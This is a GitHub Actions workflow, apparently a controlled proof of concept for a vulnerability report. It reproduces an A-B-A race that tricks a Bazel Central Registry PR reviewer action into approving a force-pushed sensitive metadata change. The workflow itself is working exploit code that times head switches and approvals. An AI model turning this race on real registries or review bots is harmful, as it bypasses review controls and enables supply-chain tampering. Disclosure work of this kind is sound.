name: GitHub-hosted BCR reviewer ABA PoC

on:
  workflow_dispatch:
    inputs:
      mode:
        description: Prepare the controlled fixture or run the A-B-A reproduction
        required: true
        type: choice
        options:
          - prepare
          - create_bot_pr
          - exploit
        default: prepare
      switch_to_b_ms:
        description: Milliseconds after the start marker before selecting benign B
        required: true
        default: "8000"
      hold_b_ms:
        description: Milliseconds to keep benign B selected before restoring A
        required: true
        default: "22000"

permissions:
  actions: read
  checks: read
  contents: write
  issues: write
  pull-requests: write

jobs:
  prepare:
    if: inputs.mode == 'prepare'
    runs-on: ubuntu-latest
    steps:
      - name: Create controlled module fixture and A/B commits
        uses: actions/github-script@v7
        with:
          script: |
            const owner = context.repo.owner;
            const repo = context.repo.repo;
            const moduleCount = 100;

            const metadataFor = (moduleName, mode) => {
              const metadata = {
                homepage: `https://example.invalid/${moduleName}`,
                maintainers: [{
                  email: 'controlled-poc@example.invalid',
                  github: 'neacsumarius1992',
                  github_user_id: 62901364,
                  name: 'Controlled PoC maintainer',
                }],
                versions: mode === 'base' ? ['1.0.0'] : ['1.0.0', '1.0.1'],
                yanked_versions: {},
              };
              if (mode === 'malicious' && moduleName === '000_target') {
                metadata.homepage = 'https://attacker.invalid/controlled-aba-poc';
              }
              return `${JSON.stringify(metadata, null, 4)}\n`;
            };

            const moduleNames = Array.from({ length: moduleCount }, (_, index) =>
              index === 0 ? '000_target' : `pad_${String(index).padStart(3, '0')}`
            );
            const blob = (path, content) => ({
              path, mode: '100644', type: 'blob', content,
            });

            const mainRef = await github.rest.git.getRef({ owner, repo, ref: 'heads/main' });
            const mainCommit = await github.rest.git.getCommit({
              owner, repo, commit_sha: mainRef.data.object.sha,
            });

            const baseEntries = [
              blob('README.md', [
                '# GitHub-hosted BCR reviewer ABA PoC',
                '',
                'Controlled reproduction for Google issue `569037834`.',
                '',
                'The test runs the exact BCR reviewer action revision `bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e`.',
                'All modules, branches, and payloads are synthetic and owned by the reporter.',
                '',
              ].join('\n')),
            ];
            for (const moduleName of moduleNames) {
              baseEntries.push(blob(
                `modules/${moduleName}/metadata.json`,
                metadataFor(moduleName, 'base'),
              ));
              baseEntries.push(blob(
                `modules/${moduleName}/1.0.0/MODULE.bazel`,
                `module(name = "${moduleName}", version = "1.0.0")\n`,
              ));
            }

            const baseTree = await github.rest.git.createTree({
              owner,
              repo,
              base_tree: mainCommit.data.tree.sha,
              tree: baseEntries,
            });
            const baseCommit = await github.rest.git.createCommit({
              owner,
              repo,
              message: 'Seed controlled BCR reviewer fixture',
              tree: baseTree.data.sha,
              parents: [mainRef.data.object.sha],
            });
            await github.rest.git.updateRef({
              owner, repo, ref: 'heads/main', sha: baseCommit.data.sha,
            });

            const benignEntries = [];
            for (const moduleName of moduleNames) {
              benignEntries.push(blob(
                `modules/${moduleName}/metadata.json`,
                metadataFor(moduleName, 'benign'),
              ));
              benignEntries.push(blob(
                `modules/${moduleName}/1.0.1/MODULE.bazel`,
                `module(name = "${moduleName}", version = "1.0.1")\n`,
              ));
            }
            const benignTree = await github.rest.git.createTree({
              owner,
              repo,
              base_tree: baseTree.data.sha,
              tree: benignEntries,
            });
            const benignCommit = await github.rest.git.createCommit({
              owner,
              repo,
              message: 'B: benign versions-only module updates',
              tree: benignTree.data.sha,
              parents: [baseCommit.data.sha],
            });

            const maliciousTree = await github.rest.git.createTree({
              owner,
              repo,
              base_tree: benignTree.data.sha,
              tree: [blob(
                'modules/000_target/metadata.json',
                metadataFor('000_target', 'malicious'),
              )],
            });
            const maliciousCommit = await github.rest.git.createCommit({
              owner,
              repo,
              message: 'A: add controlled sensitive metadata change',
              tree: maliciousTree.data.sha,
              parents: [benignCommit.data.sha],
            });

            const upsertRef = async (ref, sha) => {
              try {
                await github.rest.git.updateRef({ owner, repo, ref, sha, force: true });
              } catch (error) {
                if (error.status !== 422 && error.status !== 404) throw error;
                await github.rest.git.createRef({ owner, repo, ref: `refs/${ref}`, sha });
              }
            };
            await upsertRef('tags/poc-benign-B', benignCommit.data.sha);
            await upsertRef('tags/poc-malicious-A', maliciousCommit.data.sha);
            await upsertRef('heads/poc/aba-race', maliciousCommit.data.sha);

            for (const name of ['auto-merged', 'presubmit-auto-run', 'low-ci-priority']) {
              try {
                await github.rest.issues.createLabel({
                  owner, repo, name, color: 'ededed', description: 'Controlled PoC fixture',
                });
              } catch (error) {
                if (error.status !== 422) throw error;
              }
            }

            core.notice(`Base: ${baseCommit.data.sha}`);
            core.notice(`Benign B: ${benignCommit.data.sha}`);
            core.notice(`Malicious A: ${maliciousCommit.data.sha}`);

  racer:
    if: inputs.mode == 'exploit'
    runs-on: ubuntu-latest
    steps:
      - name: Coordinate and perform A-B-A head transition
        uses: actions/github-script@v7
        env:
          SWITCH_TO_B_MS: ${{ inputs.switch_to_b_ms }}
          HOLD_B_MS: ${{ inputs.hold_b_ms }}
        with:
          github-token: ${{ secrets.BCR_POC_PAT }}
          script: |
            const owner = context.repo.owner;
            const repo = context.repo.repo;
            const suffix = `${context.runId}-${context.runAttempt}`;
            const readyTag = `poc-racer-ready-${suffix}`;
            const startTag = `poc-reviewer-start-${suffix}`;
            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

            const main = await github.rest.git.getRef({
              owner, repo, ref: 'heads/main'
            });
            await github.rest.git.createRef({
              owner, repo, ref: `refs/tags/${readyTag}`, sha: main.data.object.sha
            });
            core.notice(`Racer ready marker: ${readyTag}`);

            let startSeen = false;
            for (let attempt = 0; attempt < 120; attempt++) {
              try {
                await github.rest.git.getRef({ owner, repo, ref: `tags/${startTag}` });
                startSeen = true;
                break;
              } catch (error) {
                if (error.status !== 404) throw error;
                await sleep(1000);
              }
            }
            if (!startSeen) {
              core.setFailed(`Timed out waiting for ${startTag}`);
              return;
            }

            const benign = await github.rest.git.getRef({
              owner, repo, ref: 'tags/poc-benign-B'
            });
            const malicious = await github.rest.git.getRef({
              owner, repo, ref: 'tags/poc-malicious-A'
            });

            const switchDelay = Number(process.env.SWITCH_TO_B_MS);
            const holdDelay = Number(process.env.HOLD_B_MS);
            await sleep(switchDelay);
            await github.rest.git.updateRef({
              owner,
              repo,
              ref: 'heads/poc/aba-race-bot',
              sha: benign.data.object.sha,
              force: true,
            });
            core.notice(`PR head switched to benign B: ${benign.data.object.sha}`);
            // Model the legitimate authorization that the vulnerable reviewer is
            // expected to bind to B. The PR is bot-authored, so the controlled
            // maintainer token can submit an independent approval.
            const prs = await github.rest.pulls.list({
              owner,
              repo,
              state: 'open',
              head: `${owner}:poc/aba-race-bot`,
            });
            if (prs.data.length !== 1) {
              throw new Error(`Expected one open bot PR, found ${prs.data.length}`);
            }
            await github.rest.pulls.createReview({
              owner,
              repo,
              pull_number: prs.data[0].number,
              commit_id: benign.data.object.sha,
              event: 'APPROVE',
              body: 'Controlled PoC approval of benign B before the A-B-A restoration.',
            });
            core.notice(`Maintainer approved benign B on PR #${prs.data[0].number}`);

            await sleep(holdDelay);
            await github.rest.git.updateRef({
              owner,
              repo,
              ref: 'heads/poc/aba-race-bot',
              sha: malicious.data.object.sha,
              force: true,
            });
            core.notice(`PR head restored to malicious A: ${malicious.data.object.sha}`);

  reviewer:
    if: inputs.mode == 'exploit'
    runs-on: ubuntu-latest
    steps:
      - name: Wait for racer and publish reviewer start marker
        uses: actions/github-script@v7
        with:
          script: |
            const owner = context.repo.owner;
            const repo = context.repo.repo;
            const suffix = `${context.runId}-${context.runAttempt}`;
            const readyTag = `poc-racer-ready-${suffix}`;
            const startTag = `poc-reviewer-start-${suffix}`;
            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

            let racerReady = false;
            for (let attempt = 0; attempt < 120; attempt++) {
              try {
                await github.rest.git.getRef({ owner, repo, ref: `tags/${readyTag}` });
                racerReady = true;
                break;
              } catch (error) {
                if (error.status !== 404) throw error;
                await sleep(1000);
              }
            }
            if (!racerReady) {
              core.setFailed(`Timed out waiting for ${readyTag}`);
              return;
            }

            const main = await github.rest.git.getRef({
              owner, repo, ref: 'heads/main'
            });
            await github.rest.git.createRef({
              owner, repo, ref: `refs/tags/${startTag}`, sha: main.data.object.sha
            });
            core.notice(`Reviewer start marker: ${startTag}`);

      - name: Stable synchronization delay
        run: sleep 5

      - name: Run exact BCR reviewer revision deployed by BCR
        uses: bazelbuild/continuous-integration/actions/bcr-pr-reviewer@bd6a90eceb738c010fd1a9b472e8b6c894e6ea4e
        with:
          token: ${{ secrets.BCR_POC_PAT }}
          action-type: review_prs

  create_bot_pr:
    if: inputs.mode == 'create_bot_pr'
    runs-on: ubuntu-latest
    steps:
      - name: Create controlled bot-authored PR at malicious A
        uses: actions/github-script@v7
        with:
          script: |
            const owner = context.repo.owner;
            const repo = context.repo.repo;
            const branch = 'poc/aba-race-bot';
            const malicious = await github.rest.git.getRef({
              owner, repo, ref: 'tags/poc-malicious-A'
            });
            try {
              await github.rest.git.updateRef({
                owner, repo, ref: `heads/${branch}`,
                sha: malicious.data.object.sha, force: true,
              });
            } catch (error) {
              if (error.status !== 422 && error.status !== 404) throw error;
              await github.rest.git.createRef({
                owner, repo, ref: `refs/heads/${branch}`,
                sha: malicious.data.object.sha,
              });
            }

            const existing = await github.rest.pulls.list({
              owner, repo, state: 'open', head: `${owner}:${branch}`,
            });
            if (existing.data.length) {
              core.notice(`Bot-authored PR already exists: #${existing.data[0].number}`);
              return;
            }
            const created = await github.rest.pulls.create({
              owner,
              repo,
              head: branch,
              base: 'main',
              title: 'Controlled bot-authored PoC: sensitive metadata ABA race',
              body: [
                'Controlled GitHub.com reproduction for Google issue 569037834.',
                '',
                'This PR is created by GitHub Actions so the restricted reporter token can act as the independent reviewer.',
                'All modules and payloads are synthetic and owned by the reporter.',
              ].join('\n'),
            });
            core.notice(`Created bot-authored PR #${created.data.number}`);
